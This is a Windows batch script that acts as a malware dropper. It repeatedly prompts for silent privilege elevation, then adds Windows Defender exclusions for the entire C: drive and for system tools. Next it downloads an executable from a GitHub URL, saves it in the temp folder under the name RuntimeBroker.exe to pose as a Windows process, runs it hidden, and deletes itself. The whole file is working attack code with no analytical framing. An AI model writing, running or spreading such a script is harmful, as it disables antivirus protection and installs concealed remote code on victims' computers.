@echo off
:: Check admin privileges
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    goto :ADMIN_PRIVILEGES
) else (
    goto :ELEVATE
)

:ADMIN_PRIVILEGES
    :: Add all exclusions first
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe'" >nul 2>&1
    
    :: Verify exclusions were added
    powershell -Command "if ((Get-MpPreference).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }" >nul 2>&1
    if %errorlevel% neq 0 (
        goto :ADMIN_PRIVILEGES
    )
    
    :: 2-second delay
    timeout /t 2 >nul
    
    :: Download file
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
    
    :: Wait for download
    :WAIT_DOWNLOAD
    if not exist "%TEMP%\RuntimeBroker.exe" (
        timeout /t 1 >nul
        goto :WAIT_DOWNLOAD
    )
    
    :: Execute
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"
    
    :: Self-delete
    del "%~f0" >nul 2>&1
    exit

:ELEVATE
    :: Elevate silently
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
    
    :: Retry if failed
    if %errorlevel% neq 0 (
        timeout /t 3 >nul
        goto :ELEVATE
    )
    exit
